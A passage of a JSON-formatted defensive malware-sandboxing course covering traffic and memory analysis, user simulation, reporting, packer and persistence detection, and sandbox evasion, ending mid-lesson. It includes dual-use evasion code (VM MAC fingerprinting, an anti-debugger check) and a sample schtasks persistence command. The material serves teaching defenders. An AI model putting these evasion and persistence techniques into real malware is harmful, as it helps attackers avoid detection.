                        "content": "<p>Wireshark is the industry-standard tool for network protocol analysis. In our lab, we will run Wireshark on our INetSim machine to capture all traffic coming from the Windows guest VM. We will then use display filters to isolate specific conversations and protocols. Key things to look for:</p><ul><li><strong>DNS Queries:</strong> What domain names is the sample trying to resolve? These are often the first IOCs discovered.</li><li><strong>HTTP/HTTPS Requests:</strong> What URLs is the sample trying to access? What is the User-Agent? What data is being sent in POST requests?</li><li><strong>Other Protocols:</strong> Some malware may use IRC, FTP, or a custom TCP protocol for C2.</li></ul>"
                    },
                    {
                        "title": "Detecting Beaconing",
                        "content": "<p>Beaconing is the 'heartbeat' of malware, a periodic check-in to its C2 server. In Wireshark, this can be identified by looking for repeated connections to the same IP address at a regular interval (e.g., every 60 seconds). This type of regular, automated traffic is highly distinct from normal user-driven web browsing.</p>"
                    }
                ],
                "codeExamples": [
                {
                    "title": "Extract DNS and HTTP Info with Scapy",
                    "language": "python",
                    "code": "# This defensive script automates the extraction of key network IOCs from a PCAP file.\n# It pulls out all DNS queries and HTTP Host headers.\nfrom scapy.all import rdpcap, DNS, DNSQR, TCP, Raw\n\ndef extract_network_iocs(pcap_file):\n    dns_queries = set()\n    http_hosts = set()\n    try:\n        pkts = rdpcap(pcap_file)\n        for p in pkts:\n            if p.haslayer(DNSQR):\n                dns_queries.add(p[DNSQR].qname.decode())\n            if p.haslayer(TCP) and p.haslayer(Raw) and (p[TCP].dport == 80 or p[TCP].sport == 80):\n                http_payload = p[Raw].load.decode(errors='ignore')\n                for line in http_payload.split('\\n'):\n                    if 'Host:' in line:\n                        http_hosts.add(line.split(' ')[1].strip())\n        print('--- DNS Queries ---', dns_queries)\n        print('--- HTTP Hosts ---', http_hosts)\n    except FileNotFoundError:\n        print(f'File not found: {pcap_file}')\n\n# Usage:\nextract_network_iocs('benign_traffic.pcap')"
                },
                {
                    "title": "Wireshark Filter for HTTP POST Requests",
                    "language": "text",
                    "code": "# Defenders use this filter in Wireshark to see only HTTP POST requests.\n# Malware often uses POST requests to exfiltrate stolen data to its C2 server.\n# The defender would then inspect the packet contents to see what data was sent.\nhttp.request.method == \"POST\""
                },
                {
                    "title": "YARA Rule to Detect a Hardcoded IP Address",
                    "language": "yara",
                    "code": "/*\nThis YARA rule performs static analysis to find files that contain hardcoded\nIP addresses, which can be an indicator of a C2 server.\n*/\nrule Detect_Hardcoded_IP\n{\n    strings:\n        // Regex to find an IPv4 address\n        $ip = /[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}/\n    condition:\n        uint16(0) == 0x5A4D and $ip\n}"
                },
                {
                    "title": "PowerShell Script for a Simple TCP Client (Benign)",
                    "language": "powershell",
                    "code": "# A defender would use a script like this as a benign sample to generate traffic.\n# When run in the sandbox, this will generate a simple TCP connection that can be\n# captured in Wireshark to test that the lab is working correctly.\n\n$tcpClient = New-Object System.Net.Sockets.TcpClient\n$ipAddress = \"192.168.56.100\" # IP of the INetSim machine\n$port = 80\n\ntry {\n    $tcpClient.Connect($ipAddress, $port)\n    Write-Host \"Connection successful.\"\n} catch {\n    Write-Host \"Connection failed.\"\n}\n$tcpClient.Close()"
                }
              ],
                "activities": [
                    {
                        "title": "Analyze Benign Traffic with Wireshark",
                        "description": "In your lab, run Wireshark on the INetSim machine. On the Windows VM, open a web browser and navigate to `http://example.com`. Stop the Wireshark capture. Analyze the captured traffic. Find the DNS query for `example.com` and the subsequent HTTP GET request. Inspect the details of the HTTP request, including the Host header and the User-Agent string."
                    }
                ]
            },
            "quiz": {
                "passingScore": 80,
                "questions": [
                    {
                        "id": 1,
                        "question": "Which of the following is LEAST likely to be a characteristic of C2 beaconing traffic?",
                        "options": ["Repeated connections to the same domain/IP.", "Connections occur at regular, predictable intervals.", "Connections are initiated by a user clicking a link.", "Connections contain small amounts of encoded data."],
                        "correct": 2,
                        "explanation": "C2 beaconing is typically automated and programmatic, occurring in the background without any user interaction."
                    },
                    {
                        "id": 2,
                        "question": "What is the first network-level event that usually occurs when a malware sample wants to contact a C2 server by its domain name?",
                        "options": ["An HTTP POST request", "An FTP download", "A DNS query", "An ICMP ping"],
                        "correct": 2,
                        "explanation": "Before an IP connection can be made to a domain name, the domain must be resolved to an IP address via a DNS query."
                    }
                ]
            }
        },
        {
            "id": "lesson-8",
            "title": "Module 3: Advanced Monitoring - Memory Analysis & Hooking",
            "duration": "120 min",
            "objectives": [
                "Understand the basics of process memory layouts (stack, heap, code sections).",
                "Learn how sandboxes use API hooking to intercept function calls.",
                "Identify common methods of code injection from memory analysis.",
                "Use the Volatility framework to perform basic memory forensics on a capture."
            ],
            "content": {
                "overview": "Some malware tries to hide its activity by performing all of its work in memory, without ever writing its core logic to disk. Memory analysis allows a defender to find this 'fileless' activity and to analyze the true, unpacked code of a packed binary. This lesson covers the fundamentals of monitoring and analyzing process memory.",
                "sections": [
                    {
                        "title": "Process Memory Layout",
                        "content": "<p>When a program is run, the OS allocates virtual memory for it, typically divided into several sections:</p><ul><li><strong>Code Sections (`.text`):</strong> Contain the executable instructions. This memory should be Read/Execute but not Writable.</li><li><strong>Data Sections (`.data`, `.bss`):</strong> Contain global variables. This memory is Read/Write but should not be Executable.</li><li><strong>The Stack:</strong> Used for local variables and function call management.</li><li><strong>The Heap:</strong> Used for dynamic memory allocation during runtime.</li></ul>"
                    },
                    {
                        "title": "Detecting Injected Code",
                        "content": "<p>Code injection often leaves suspicious artifacts in memory. A sandbox or a memory forensics tool like Volatility can scan all the running processes for these anomalies:</p><ul><li><strong>RWX Memory:</strong> A region of memory that is simultaneously Readable, Writable, and Executable is highly suspicious. Normal programs rarely need this, but it is a hallmark of unpacked or injected code. This is a primary target for the Volatility `malfind` plugin.</li><li><strong>Unlinked DLLs:</strong> Malware may load a DLL into a process's memory in a stealthy way that doesn't properly link it to the process's module list. Memory analysis can find these hidden modules by comparing different data structures in the kernel.</li></ul>"
                    }
                ],
                "codeExamples": [
                {
                    "title": "Volatility Command: List Processes from a Memory Dump",
                    "language": "bash",
                    "code": "# Volatility is the standard tool for offline memory analysis. A defender runs this\n# against a captured memory image. The 'windows.pslist.PsList' plugin lists all running processes,\n# which can be compared against a live process listing to find hidden rootkit processes.\npython3 vol.py -f memory.vmem windows.pslist.PsList"
                },
                {
                    "title": "Volatility Command: Scan for Injected Code",
                    "language": "bash",
                    "code": "# The 'malfind' plugin is one of Volatility's most powerful detection features.\n# It scans all processes in the memory image for regions of memory with suspicious\n# characteristics (like RWX permissions) and dumps any code it finds.\npython3 vol.py -f memory.vmem windows.malfind.Malfind"
                },
                {
                    "title": "Ghidra: Importing a Memory Dump",
                    "language": "text",
                    "code": "// A defender can analyze code that was dumped from memory (e.g., by Volatility's malfind).\n// 1. In Ghidra, start a new project.\n// 2. File -> Import File...\n// 3. Select the raw binary file that was dumped from memory.\n// 4. For the format, select 'Raw Binary'.\n// 5. For the language, select the correct architecture (e.g., x86:LE:32:default).\n// 6. Ghidra will load the raw bytes. The defender must then press 'D' to start disassembling and 'C' to define functions manually."
                },
                {
                    "title": "PowerShell Script to Check for RWX Memory (Live)",
                    "language": "powershell",
                    "code": "# This advanced script shows a live analysis technique. A defender would use this to\n# iterate through all processes and inspect their memory pages, looking for the tell-tale\n# 'ExecuteReadWrite' permission that could indicate injected code.\n# This requires a library or native API calls not shown for simplicity.\n# Concept:\n# Get-Process | ForEach-Object {\n#   Get-ProcessMemoryPages -Id $_.Id | Where-Object { $_.Protection -eq 'ExecuteReadWrite' } | ForEach-Object {\n#     Write-Host \"[ALERT] RWX memory found in process $($_.ProcessName) at address $($_.BaseAddress)\"\n#   }\n# }"
                }
              ],
                "activities": [
                    {
                        "title": "Analyze a Benign Memory Dump",
                        "description": "Given a memory dump from a benign Windows machine, use the Volatility framework to analyze it. Run the `windows.pslist` command to see the running processes. Run the `windows.netscan` command to find network artifacts. This lab familiarizes you with the tool's syntax and output on a known-good baseline."
                    }
                ]
            },
            "quiz": {
                "passingScore": 80,
                "questions": [
                    {
                        "id": 1,
                        "question": "A region of memory that has its permissions set to Read, Write, and Execute (RWX) simultaneously is suspicious because:",
                        "options": ["It is normal for all programs and not suspicious.", "Legitimate programs rarely need to write to and execute from the same memory region, whereas this is very common for unpacked or injected malicious code.", "It causes the program to use more RAM.", "It is only used by the Windows kernel."],
                        "correct": 1,
                        "explanation": "This violates the principle of W^X (Write XOR Execute). Memory should be either writable or executable, but not both. RWX memory is a strong indicator of self-modifying or injected code."
                    },
                    {
                        "id": 2,
                        "question": "The Volatility `malfind` command is primarily used by defenders to:",
                        "options": ["Find malicious files on disk.", "Scan a memory image for suspicious and potentially injected code within processes.", "List all running processes.", "Capture network traffic."],
                        "correct": 1,
                        "explanation": "`malfind` is specifically designed to hunt for the tell-tale signs of code injection within a process's memory space, making it one of the most important plugins for malware analysis."
                    }
                ]
            }
        },
        {
            "id": "lesson-9",
            "title": "Module 3: Advanced Monitoring - User Interaction Simulation",
            "duration": "90 min",
            "objectives": [
                "Understand why simulating user activity is necessary for some malware.",
                "Differentiate between simple and complex human interaction simulation.",
                "Write simple automation scripts using `pyautogui`.",
                "Recognize how malware might detect fake user activity."
            ],
            "content": {
                "overview": "Some malware is 'human-activated'; it will not perform its malicious actions until it detects certain user behavior, like mouse movement or clicking on a specific button. This lesson covers how advanced sandboxes simulate this user interaction to trick the malware into revealing its true payload.",
                "sections": [
                    {
                        "title": "Why Simulate a User?",
                        "content": "<p>Malware authors know their code is being analyzed in automated sandboxes. To evade detection, they may program the malware to lie dormant until it detects signs of a real user. These checks can include:</p><ul><li><strong>Mouse Movement:</strong> The malware checks if the mouse cursor has moved recently. In a basic sandbox, the cursor is often static.</li><li><strong>Window Interaction:</strong> The payload might only trigger if the user clicks a specific button or menu item.</li><li><strong>Document Scrolling:</strong> A malicious document might wait for the user to scroll down before running its macro.</li></ul>"
                    },
                    {
                        "title": "Automation Techniques",
                        "content": "<p>Sandboxes implement scripts that simulate these actions. A simple script might just wiggle the mouse cursor around randomly. A more advanced script might identify all the clickable buttons in an application's GUI and systematically click each one to see what happens. This increases the chances that a hidden, malicious function will be triggered during the analysis run.</p>"
                    }
                ],
                "codeExamples": [
                {
                    "title": "Simple Mouse Wiggling with `pyautogui`",
                    "language": "python",
                    "code": "# A defender building a sandbox would use a library like this to simulate user activity.\n# This simple script moves the mouse in a random pattern for 10 seconds to defeat\n# basic 'is a human present?' checks.\nimport pyautogui\nimport random\nimport time\n\nprint('Simulating mouse movement for 10 seconds...')\nend_time = time.time() + 10\nwhile time.time() < end_time:\n    x = random.randint(0, 500)\n    y = random.randint(0, 500)\n    pyautogui.moveTo(x, y, duration=0.5)\n    time.sleep(1)\nprint('Simulation finished.')"
                },
                {
                    "title": "Automating Keystrokes with `pyautogui`",
                    "language": "python",
                    "code": "# This script demonstrates how a sandbox can automate typing.\n# This might be used to enter a password into a decoy document or fill out a form.\nimport pyautogui\nimport time\n\n# Bring a text editor window into focus first\n# time.sleep(3)\npyautogui.write('This is automated typing to trigger behavior.', interval=0.1)"
                },
                {
                    "title": "Conceptual Cuckoo Human Interaction Script",
                    "language": "python",
                    "code": "# Cuckoo and CAPE have a 'human.py' script that can be customized.\n# This conceptual code shows the logic a defender would use to make the sandbox\n# appear more like a real user's machine by opening and closing common programs.\nimport os\nimport time\n\n# def simulate_user_activity():\n#     os.startfile('notepad.exe')\n#     time.sleep(5)\n#     os.system('taskkill /f /im notepad.exe')\n#     time.sleep(2)\n#     os.startfile('calc.exe')\n#     time.sleep(5)\n#     os.system('taskkill /f /im calc.exe')\n\nprint('Conceptual code for sandbox humanization.')"
                },
                {
                    "title": "PowerShell Script to Get Mouse Position",
                    "language": "powershell",
                    "code": "# This is a script that simulates a check malware might perform.\n# A defender would run this to understand what kind of data the malware can collect.\n# It continuously checks the mouse position. If the position doesn't change for a long time,\n# the malware might assume it's in a sandbox.\n# Add-Type -AssemblyName System.Windows.Forms\n# $lastPos = [System.Windows.Forms.Cursor]::Position\n# while ($true) {\n#     Start-Sleep -Seconds 5\n#     $currentPos = [System.Windows.Forms.Cursor]::Position\n#     if ($currentPos -eq $lastPos) {\n#         Write-Host \"Mouse has not moved.\"\n#     }\n#     $lastPos = $currentPos\n# }"
                }
              ],
                "activities": [
                    {
                        "title": "Script Benign Sandbox Automation",
                        "description": "In your Windows lab VM, install the `pyautogui` library for Python. Write a simple script that first opens Notepad, then types a sentence into it, waits for a few seconds, and then closes Notepad. This simulates a basic, automated user interaction."
                    }
                ]
            },
            "quiz": {
                "passingScore": 80,
                "questions": [
                    {
                        "id": 1,
                        "question": "Why would a malware author program their sample to only execute its payload after the mouse has been moved?",
                        "options": ["To save battery power.", "To evade simple automated sandboxes where the mouse cursor might remain static.", "To make the program more interactive for the user.", "To ensure the user is looking at the screen."],
                        "correct": 1,
                        "explanation": "This is a common anti-sandbox technique. The absence of mouse movement is a strong indicator of a non-interactive, automated environment."
                    },
                    {
                        "id": 2,
                        "question": "Advanced sandboxes that automate clicking on GUI buttons are designed to defeat what kind of malware?",
                        "options": ["Worms", "Malware that hides its payload behind a specific user action, requiring a click to activate.", "Fileless malware", "Rootkits"],
                        "correct": 1,
                        "explanation": "If a malicious function is only called when a specific button is pressed, the sandbox must be able to simulate that press to observe the behavior."
                    }
                ]
            }
        },
        {
            "id": "lesson-10",
            "title": "Module 3: Advanced Monitoring - Sandbox Reporting",
            "duration": "90 min",
            "objectives": [
              "Identify the key components of a high-quality automated sandbox report.",
              "Differentiate between raw data and processed, high-level behavioral indicators.",
              "Practice extracting key Indicators of Compromise (IOCs) from a JSON report.",
              "Understand how to build a coherent timeline of events from disparate log sources."
            ],
            "content": {
              "overview": "The raw data from a sandbox run can be overwhelming. The true value of an automated sandbox lies in its ability to process this data and present it in a structured, easy-to-understand report. This lesson covers the typical structure of these reports and how to extract the most important information.",
              "sections": [
                {
                  "title": "Anatomy of a Sandbox Report",
                  "content": "<p>A good sandbox report combines raw data with intelligent processing:</p><ul><li><strong>File Details:</strong> Hashes (MD5, SHA1, SHA256), file type, entropy, and results from static analysis like strings and imports.</li><li><strong>Behavioral Signatures:</strong> A high-level summary of malicious behaviors detected (e.g., 'Allocates RWX memory', 'Creates a registry key for persistence', 'Contacts a known C2 domain'). These are created by a rules engine that analyzes the raw API logs.</li><li><strong>Process Tree:</strong> A visual graph showing which processes were created and their parent-child relationships.</li><li><strong>Timeline of Events:</strong> An interleaved timeline showing network, file, registry, and process events in the order they occurred.</li><li><strong>IOC List:</strong> A clean, machine-readable list of all domains, IPs, file hashes, and registry keys that were observed.</li><li><strong>MITRE ATT&CK Mapping:</strong> The behavioral signatures are often mapped to the corresponding ATT&CK Technique IDs, which provides crucial context for defenders.</li></ul>"
                }
              ],
              "codeExamples": [
                {
                    "title": "Parse a Cuckoo JSON Report with Python",
                    "language": "python",
                    "code": "# A defender often needs to programmatically interact with sandbox results.\n# This script parses the detailed JSON report from a Cuckoo sandbox to extract key IOCs.\nimport json\n\ndef parse_cuckoo_json(report_path):\n    try:\n        with open(report_path, 'r') as f:\n            data = json.load(f)\n            # Extract target file info\n            print('--- File Hashes ---')\n            print('MD5:', data.get('target', {}).get('file', {}).get('md5'))\n            # Extract network info\n            print('\\n--- Network IOCs ---')\n            for domain in data.get('network', {}).get('domains', []):\n                print('Domain:', domain['domain'])\n            # Extract high-level signatures\n            print('\\n--- Behavioral Signatures ---')\n            for sig in data.get('signatures', []):\n                print(f\"- {sig['description']}\")\n    except Exception as e:\n        print(f'Error processing report: {e}')\n\n# Usage:\n# parse_cuckoo_json('cuckoo_report.json')"
                },
                {
                    "title": "Generate a YARA Rule from Sandbox Signatures",
                    "language": "python",
                    "code": "# This script demonstrates how a defender can automate detection rule creation.\n# It takes unique strings from a sandbox report and automatically builds a basic YARA rule.\n\ndef create_yara_from_strings(unique_strings):\n    rule = 'rule Auto_Generated_Rule {\\n'\n    rule += '    strings:\\n'\n    for i, s in enumerate(unique_strings):\n        # A real script would sanitize the string to make it a valid identifier\n        rule += f'        $s{i} = \"{s}\"\\n'\n    rule += '    condition:\\n'\n    rule += '        any of them\\n' # or 'all of them'\n    rule += '}'\n    return rule\n\n# discovered_strings = ['evil_mutex', 'C:\\\\bad\\file.exe']\n# print(create_yara_from_strings(discovered_strings))"
                },
                {
                    "title": "Create a Timeline from ProcMon and Wireshark Logs (Conceptual)",
                    "language": "python",
                    "code": "# A defender's goal is to create a single story of what happened.\n# This conceptual script shows the logic for merging timed events from different log\n# sources into a single, sorted timeline.\n\n# procmon_events = [{'time': 100, 'event': 'CreateFile'}, {'time': 102, 'event': 'WriteFile'}]\n# wireshark_events = [{'time': 101, 'event': 'DNS Query for evil.com'}]\n\n# all_events = sorted(procmon_events + wireshark_events, key=lambda x: x['time'])\n\n# for event in all_events:\n#     print(f\"Time {event['time']}: {event['event']}\")"
                },
                {
                    "title": "STIX 2.1 Representation of a Sandbox Finding",
                    "language": "json",
                    "code": "{\n  \"type\": \"indicator\",\n  \"spec_version\": \"2.1\",\n  \"id\": \"indicator--...\", // A unique ID\n  \"pattern_type\": \"stix\",\n  \"valid_from\": \"2023-01-01T00:00:00Z\",\n  \"name\": \"Suspicious Beacon to C2 Domain\",\n  \"description\": \"The sample was observed beaconing to a known malicious domain.\",\n  \"pattern\": \"[domain-name:value = 'evil-c2.com']\"\n}"
                }
              ],
              "activities": [
                {
                  "title": "Create a Sandbox Report for a Benign File",
                  "description": "Run a benign program (like a software installer) through your manual analysis process (ProcMon, Wireshark, Regshot). Based on the logs you collect, manually create a markdown document that follows the structure of an automated sandbox report. Include sections for file details, a behavioral summary (what the installer did), and a list of IOCs (files created, registry keys modified, etc.)."
                }
              ]
            },
            "quiz": {
              "passingScore": 80,
              "questions": [
                {
                  "id": 1,
                  "question": "What is the difference between raw sandbox data and a 'behavioral signature'?",
                  "options": ["There is no difference.", "Raw data is the unprocessed log of all API calls, while a behavioral signature is a high-level conclusion drawn from that data (e.g., 'the process attempted to achieve persistence').", "A behavioral signature is another name for a file hash.", "Raw data is less accurate."],
                  "correct": 1,
                  "explanation": "The sandbox's intelligence lies in its ability to abstract away from millions of low-level events to produce a small number of high-confidence, human-readable behavioral descriptions."
                },
                {
                  "id": 2,
                  "question": "Mapping sandbox findings to the MITRE ATT&CK framework is useful for a defender because:",
                  "options": ["It provides a standardized, industry-wide language for describing the attacker's techniques.", "It is required by law.", "It automatically blocks the attack.", "It tells you the name of the attacker."],
                  "correct": 0,
                  "explanation": "ATT&CK provides a common taxonomy, which allows defenders to understand the malware's TTPs and compare findings across different tools and organizations."
                }
              ]
            }
        },
        {
            "id": "lesson-11",
            "title": "Module 4: Evasion & Detection - Packed & Obfuscated Binaries",
            "duration": "90 min",
            "objectives": [
              "Understand why malware is often packed or obfuscated.",
              "Use entropy analysis and other static heuristics to identify packed files.",
              "Recognize the signatures of common packers like UPX.",
              "Discuss how sandboxing helps in analyzing packed binaries."
            ],
            "content": {
              "overview": "Attackers know that defenders use static analysis. To defeat it, they use packers and obfuscators to hide the true nature of their code. This lesson focuses on the techniques that defenders and sandboxes use to detect this kind of evasion before a deeper analysis even begins.",
              "sections": [
                {
                  "title": "Detecting Packing with Static Heuristics",
                  "content": "<p>A sandbox will often perform a quick static scan of a file before running it. It looks for several red flags that indicate packing:</p><ul><li><strong>High Entropy:</strong> A Shannon entropy value above 7.2 (on a scale of 0-8) is a very strong indicator that the file's contents are compressed or encrypted.</li><li><strong>Anomalous Sections:</strong> Packers often add new PE sections with strange names (e.g., `UPX0`, `.aspack`) or with permissions that are both Writable and Executable.</li><li><strong>Few Imports:</strong> A packed file often has a very small Import Address Table (IAT) because only the unpacking stub's imports are visible. The true imports of the original program are hidden.</li></ul>"
                },
                {
                    "title": "Analyzing Packed Binaries in a Sandbox",
                    "content": "<p>Dynamic analysis in a sandbox is the primary way to defeat packing. The sandbox doesn't care that the file on disk is obfuscated. It simply runs the packed file, the unpacking stub executes, and the original, unpacked code is written to memory. The sandbox's memory monitoring can then analyze this clean code and its behavior. This is why memory forensics and API hooking are so crucial.</p>"
                }
              ],
              "codeExamples":[
              {
                "title": "Calculate and Visualize PE Section Entropy",
                "language": "python",
                "code": "# A defender uses this script to get more granular detail than a whole-file entropy check.\n# High entropy in the `.text` (code) section is particularly indicative of packing.\nimport pefile\nimport math\nfrom collections import Counter\n\ndef shannon_entropy(data):\n    # (Shannon entropy function from previous lessons)\n    # ...\n\n# def get_section_entropy(file_path):\n#     pe = pefile.PE(file_path)\n#     for section in pe.sections:\n#         name = section.Name.decode().strip('\\x00')\n#         entropy = shannon_entropy(section.get_data())\n#         print(f'Section: {name}, Entropy: {entropy:.2f}')\n# get_section_entropy('benign_sample.exe')"
              },
              {
                "title": "Check for Writable and Executable Sections",
                "language": "python",
                "code": "# This script uses pefile to check for a major red flag: PE sections that are both writable and executable.\n# Defenders use this check to find likely packer or malware-related sections.\nimport pefile\n\n# def check_section_permissions(file_path):\n#     pe = pefile.PE(file_path)\n#     for section in pe.sections:\n#         is_writable = section.Characteristics & 0x80000000\n#         is_executable = section.Characteristics & 0x20000000\n#         if is_writable and is_executable:\n#             name = section.Name.decode().strip('\\x00')\n#             print(f'[ALERT] Section {name} is both writable and executable!')\n# check_section_permissions('benign_packed_sample.exe')"
              },
              {
                "title": "YARA Rule for High Entropy",
                "language": "yara",
                "code": "/*\nDefenders use this rule to automatically flag files that are likely packed.\nIt uses the built-in 'entropy' module in YARA to calculate the entropy of the file's\nentry point section and flags it if it's above a certain threshold.\n*/\nimport \"pe\"\nimport \"math\"\n\nrule High_Entropy_EntryPoint\n{\n    condition:\n        pe.is_pe and math.entropy(pe.entry_point, pe.image_base) > 7.0\n}"
              },
              {
                "title": "Use `die` (Detect It Easy) for Packer Identification",
                "language": "bash",
                "code": "# `die` is a popular tool for defenders that uses multiple signatures and heuristics\n# to identify the compiler, packer, and protector used on an executable.\n\ndie benign_packed_sample.exe"
              }
              ],
              "activities": [
                {
                  "title": "Compare Entropy of Clean vs Packed Samples",
                  "description": "Take a benign executable file. First, calculate the entropy of its `.text` section using the provided script. Then, pack the executable with UPX. Now, run the script again on the packed version and observe how the entropy of the `UPX1` section (the new code section) is dramatically higher."
                }
              ]
            },
            "quiz": {
              "passingScore": 80,
              "questions": [
                {
                  "id": 1,
                  "question": "A PE file with an entropy score of 7.8, a single section named `.aspack`, and only 3 imported functions is very likely:",
                  "options": ["A benign text file", "A system driver", "A packed executable", "A C++ source code file"],
                  "correct": 2,
                  "explanation": "All of these are classic static indicators of a packed executable: high entropy, an anomalous section name, and a tiny import table."
                },
                {
                  "id": 2,
                  "question": "Why is dynamic analysis in a sandbox effective against packed malware?",
                  "options": ["It prevents the malware from running.", "The sandbox executes the sample, allowing the packer's unpacking stub to run and write the true, original code into memory, which the sandbox can then monitor.", "It can guess the encryption key.", "It isn't effective."],
                  "correct": 1,
                  "explanation": "Dynamic analysis sidesteps the static obfuscation of the packer by letting the sample unpack itself into memory, where its true behavior can be observed."
                }
              ]
            }
        },
        {
            "id": "lesson-12",
            "title": "Module 4: Evasion & Detection - Persistence Mechanism Detection",
            "duration": "90 min",
            "objectives": [
              "Review the most common malware persistence techniques.",
              "Write behavioral rules to detect the creation of Run keys and malicious services.",
              "Use PowerShell and Autoruns to audit for persistence on a live system.",
              "Extract persistence IOCs from sandbox logs and memory dumps."
            ],
            "content": {
              "overview": "Detecting persistence is one of the most critical functions of a sandbox or an EDR tool. If malware can't survive a reboot, its impact is severely limited. This lesson focuses on the behavioral signatures and forensic artifacts associated with common persistence TTPs.",
              "sections": [
                {
                  "title": "Behavioral Signatures for Persistence",
                  "content": "<p>A sandbox doesn't just look at individual API calls; it looks for sequences of calls that indicate a specific technique. For registry key persistence, the signature is:</p><ol><li>An `RegCreateKeyEx` call to one of the `CurrentVersion\\Run` keys.</li><li>Followed by a `RegSetValueEx` call to that key, where the data being written is a path to an executable file.</li></ol><p>This sequence is a high-confidence indicator. Similar behavioral signatures exist for creating scheduled tasks via `schtasks.exe` or creating new services via the `CreateServiceA` API.</p>"
                }
              ],
              "codeExamples":[
              {
                "title": "Sysmon Configuration for Registry Persistence",
                "language": "xml",
                "code": "<!-- Sysmon is a powerful monitoring tool from Microsoft. Defenders deploy a configuration\nlike this to generate a detailed event log whenever a program modifies a common registry run key.\n-->\n<Sysmon schemaversion=\"4.81\">\n    <EventFiltering>\n        <RuleGroup name=\"\" groupRelation=\"or\">\n            <RegistryEvent onmatch=\"include\">\n                <TargetObject condition=\"contains\">\\Microsoft\\Windows\\CurrentVersion\\Run</TargetObject>\n            </RegistryEvent>\n        </RuleGroup>\n    </EventFiltering>\n</Sysmon>"
              },
              {
                "title": "Use `Autoruns` for Live Analysis",
                "language": "bash",
                "code": "# Autoruns is a powerful tool from Sysinternals that defenders use to inspect\n# nearly every possible persistence location on a live Windows system.\n# The `-a *` flag tells it to show all entries. A defender would look for unsigned binaries or suspicious paths.\nautorunsc.exe -a *"
              },
              {
                "title": "Parse ProcMon Log for Persistence Signatures",
                "language": "python",
                "code": "# This script automates the search for registry-based persistence in a ProcMon CSV log.\n# It specifically looks for a process writing to a 'Run' key.\nimport csv\n\ndef find_reg_persistence(procmon_csv_path):\n    try:\n        with open(procmon_csv_path, 'r', encoding='utf-8') as f:\n            reader = csv.DictReader(f)\n            for row in reader:\n                if row['Operation'] == 'RegSetValue' and 'CurrentVersion\\\\Run' in row['Path']:\n                    print(f\"[ALERT] Persistence Attempt Detected!\")\n                    print(f\"  Process: {row['Process Name']}\")\n                    print(f\"  Key: {row['Path']}\")\n                    print(f\"  Value: {row['Detail']}\")\n    except FileNotFoundError:\n        print(f'File not found: {procmon_csv_path}')\n# Usage:\n# find_reg_persistence('procmon_log.csv')"
              },
              {
                "title": "Volatility Command to Find Persistence in Memory",
                "language": "bash",
                "code": "# Some Volatility plugins can reconstruct persistence info from a memory dump.\n# This is useful for finding malware that tries to clean up its tracks on disk.\n# The 'autoruns' plugin in Volatility 3 community extensions would perform this function.\n# python3 vol.py -f memory.vmem windows.autoruns"
              }
              ],
              "activities": [
                {
                  "title": "Extract Persistence IOCs from Logs",
                  "description": "Given a sandbox report (JSON format) or a ProcMon CSV log from a benign software installer, write a script to parse the log and find any registry keys or files that were created for persistence or auto-update purposes. Differentiate between legitimate persistence (e.g., an updater service) and potentially suspicious persistence."
                }
              ]
            },
            "quiz": {
              "passingScore": 80,
              "questions": [
                {
                  "id": 1,
                  "question": "Sysmon is a tool used by defenders for:",
                  "options": ["Scanning files for viruses.", "Providing deep, real-time logging of system activity like process creation, network connections, and registry modifications.", "Analyzing network packets.", "Editing the registry."],
                  "correct": 1,
                  "explanation": "Sysmon provides a much more detailed level of logging than the default Windows event logs, making it invaluable for detection engineering and incident response."
                },
                {
                  "id": 2,
                  "question": "A sandbox report contains an event showing `schtasks.exe` was run with the arguments `/Create /TN Updater /TR C:\\Users\\Admin\\AppData\\temp.exe`. This is a high-confidence indicator of what?",
                  "options": ["The program is encrypting files.", "The program is attempting to achieve persistence by creating a scheduled task.", "The program is trying to contact a C2 server.", "The program is checking if it is in a VM."],
                  "correct": 1,
                  "explanation": "This specific command line is the standard way to create a new scheduled task, a very common TTP for malware persistence."
                }
              ]
            }
        },
        {
            "id": "lesson-13",
            "title": "Module 4: Evasion & Detection - Sandbox Evasion Basics",
            "duration": "90 min",
            "objectives": [
              "Understand the motivation behind sandbox evasion.",
              "Identify common anti-VM checks that look for hardware, file, or registry artifacts.",
              "Recognize timing-based evasions used to out-wait a sandbox.",
              "Learn how malware detects common analysis and debugging tools."
            ],
            "content": {
              "overview": "Malware authors know their code will be analyzed, so they build in checks to detect if they are running inside a sandbox or a researcher's VM. If a sandbox environment is detected, the malware will often refuse to run its malicious payload, fooling the automated system. This lesson covers the most common evasion techniques.",
              "sections": [
                {
                  "title": "Detecting the Environment",
                  "content": "<p>Malware can fingerprint the machine it's on to look for signs of virtualization:</p><ul><li><strong>Hardware Artifacts:</strong> Checking for virtualized device names (e.g., 'VMware SVGA II Adapter'), known VM MAC addresses, or a small number of CPU cores.</li><li><strong>File & Registry Artifacts:</strong> Searching for files, directories, or registry keys left by VM guest additions tools (e.g., `C:\\Program Files\\VMware\\VMware Tools`).</li><li><strong>Tool Detection:</strong> Checking for the presence of running processes associated with analysis tools, such as `procmon.exe`, `wireshark.exe`, or `x64dbg.exe`.</li></ul>"
                },
                {
                    "title":"Timing and Interaction-Based Evasions",
                    "content":"<p>Malware assumes a sandbox has a limited time to run. It might use a `Sleep()` call for a long period (e.g., 15 minutes) before running its payload. Many sandboxes will time out before this period is over. It may also wait for human interaction, like mouse movement, before activating, which a simple sandbox might not simulate.</p>"
                }
              ],
              "codeExamples":[
              {
                "title": "PowerShell Script to Check for VM MAC Addresses",
                "language": "powershell",
                "code": "# A defender runs this on their lab VM to see how easily it can be fingerprinted.\n# Malware uses this same check to detect if it's running in a virtual environment.\n$vmMacPrefixes = @(\"08:00:27\", \"00:05:69\", \"00:0C:29\", \"00:1C:14\")\n$mac = (Get-NetAdapter).MacAddress\nforeach ($prefix in $vmMacPrefixes) {\n    if ($mac -like \"$prefix*\") {\n        Write-Host \"[ALERT] VM MAC address prefix detected: $mac\"\n    }\n}"
              },
              {
                "title": "C++ Code to Check for Debugger",
                "language": "cpp",
                "code": "// Defenders study this code to understand how to bypass it.\n// The `IsDebuggerPresent` API call is the most common anti-debug trick.\n#include <windows.h>\n\nvoid CheckForDebugger() {\n    if (IsDebuggerPresent()) {\n        // Malware would exit or change behavior here.\n        MessageBoxA(NULL, \"Debugger detected!\", \"Anti-Debug\", 0);\n        ExitProcess(0);\n    }\n}"
              },
              {
                "title": "C++ Code for a Timing Attack",
                "language": "cpp",
